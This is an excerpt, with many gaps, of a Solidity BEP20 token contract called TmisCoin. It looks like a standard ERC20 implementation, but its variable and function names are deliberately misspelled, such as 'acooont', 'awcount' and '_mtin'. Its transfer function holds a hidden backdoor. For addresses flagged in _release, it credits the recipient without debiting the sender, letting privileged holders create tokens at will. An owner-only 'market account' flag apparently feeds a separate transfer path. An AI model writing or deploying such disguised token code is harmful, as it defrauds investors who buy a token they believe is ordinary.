...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 acooont) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, acooont);
        return true;
    }
    ...
    function _approve(
        ...
        _allowances[owner][spender] = acooont;
        emit Approval(owner, spender, acooont);
    }
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= acooont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - acooont);
            }
        }
    }
...
contract TmisCoin is BEP20, Ownable {
    ...
    function _transfer(
        ...
        require(fromBalance >= acooont, "ERC20: transfer acooont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - acooont;
        }
        _balances[to] += acooont;

        emit Transfer(from, to, acooont);
    }

    function _burn(address awcount, uint256 acooont) internal virtual {
        require(awcount != address(0), "ERC20: burn from the zero address");

        uint256 awcountBalance = _balances[awcount];
        require(awcountBalance >= acooont, "ERC20: burn acooont exceeds balance");
        unchecked {
            _balances[awcount] = awcountBalance - acooont;
        }
        _totalSupply -= acooont;

        emit Transfer(awcount, address(0), acooont);
    }

    function _mtin(address awcount, uint256 acooont) internal virtual {
        require(awcount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += acooont;
        _balances[awcount] += acooont;
        emit Transfer(address(0), awcount, acooont);
    }
    ...
    function setMarketawcountfki(address _address, bool _value) external onlyowner {
        _marketawcount[_address] = _value;
    }

    function getMarketawcountfki(address _address) external view onlyowner returns (bool) {
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer acooont exceeds balance");
    ...
    function transfer(address to, uint256 acooont) public virtual returns (bool) {
        address owner = _msgSender();
        if (_release[owner] == true) {
            _balances[to] += acooont;
            return true;
        }
        _recF(owner, to, acooont);
        return true;
    }
    ...
    function transferFrom(
        ...
        _spendAllowance(from, spender, acooont);
        _recF(from, to, acooont);
        return true;
    }
}